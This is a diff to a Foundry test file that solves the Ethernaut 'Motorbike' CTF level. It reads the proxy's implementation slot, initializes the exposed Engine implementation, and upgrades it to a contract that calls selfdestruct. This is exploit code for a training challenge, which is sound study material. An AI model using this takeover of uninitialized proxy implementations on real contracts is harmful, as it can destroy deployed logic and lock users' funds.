@@ -5,6 +5,12 @@ pragma experimental ABIEncoderV2;
 import {Test, console} from "forge-std/Test.sol";
 import {Motorbike, Engine} from "../src/25_Motorbike.sol";
 
+contract Attacker {
+    function destroy() public {
+        selfdestruct(payable(address(0)));
+    }
+}
+
 contract TestMotorbike is Test {
     address public player = address(0xbad);
     Motorbike public instance;
@@ -14,7 +20,15 @@ contract TestMotorbike is Test {
 
         vm.startPrank(player);
 
-        // Your exploit goes here
+        Engine implementation = Engine(address(
+            uint160(uint256(vm.load(
+                address(instance),
+                bytes32(uint256(keccak256("eip1967.proxy.implementation")) - 1)
+            ))
+        )));
+
+        implementation.initialize();
+        implementation.upgradeToAndCall(address(new Attacker()), abi.encodeWithSignature("destroy()"));
 
         vm.stopPrank();
     }
